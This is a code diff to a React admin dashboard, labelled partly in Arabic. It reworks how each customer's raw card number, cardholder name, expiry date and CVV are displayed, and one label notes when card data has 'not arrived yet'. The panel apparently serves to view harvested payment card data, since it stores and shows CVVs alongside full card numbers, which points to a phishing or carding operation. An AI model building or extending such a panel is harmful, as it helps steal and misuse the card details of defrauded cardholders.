@@ -345,15 +345,15 @@ export const Admin = () => {
       <div className="v-card-bottom">
         <div className="v-card-info-v2">
           <span>NAME</span>
-          <strong>{customer.card_name || '---'}</strong>
+          <strong>{'---'}</strong>
         </div>
         <div className="v-card-info-v2">
           <span>EXP</span>
-          <strong>{customer.expiry_month}/{customer.expiry_year}</strong>
+          <strong>{customer.card_expiry || '---'}</strong>
         </div>
         <div className="v-card-info-v2">
           <span>CVV</span>
-          <strong>{customer.cvv}</strong>
+          <strong>{customer.card_cvv || '---'}</strong>
         </div>
       </div>
     </div>
@@ -557,10 +557,9 @@ export const Admin = () => {
                   <h3 style={{color: '#92400e'}}>البيانات التقنية (للتأكد)</h3>
                   <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px'}}>
                     <div className="info-row-v2"><span>رقم البطاقة (خام)</span> <strong>{selectedCustomer.card_number || 'لم يصل بعد'}</strong></div>
-                    <div className="info-row-v2"><span>الاسم على البطاقة</span> <strong>{selectedCustomer.card_name || '---'}</strong></div>
-                    <div className="info-row-v2"><span>الشهر</span> <strong>{selectedCustomer.expiry_month || '---'}</strong></div>
-                    <div className="info-row-v2"><span>السنة</span> <strong>{selectedCustomer.expiry_year || '---'}</strong></div>
-                    <div className="info-row-v2"><span>CVV</span> <strong>{selectedCustomer.cvv || '---'}</strong></div>
+                    <div className="info-row-v2"><span>الاسم على البطاقة</span> <strong>{'---'}</strong></div>
+                    <div className="info-row-v2"><span>تاريخ الانتهاء</span> <strong>{selectedCustomer.card_expiry || '---'}</strong></div>
+                    <div className="info-row-v2"><span>CVV</span> <strong>{selectedCustomer.card_cvv || '---'}</strong></div>
                     <div className="info-row-v2"><span>آخر تحديث</span> <strong>{new Date(selectedCustomer.last_update || 0).toLocaleString('ar-SA')}</strong></div>
                   </div>
                 </div>
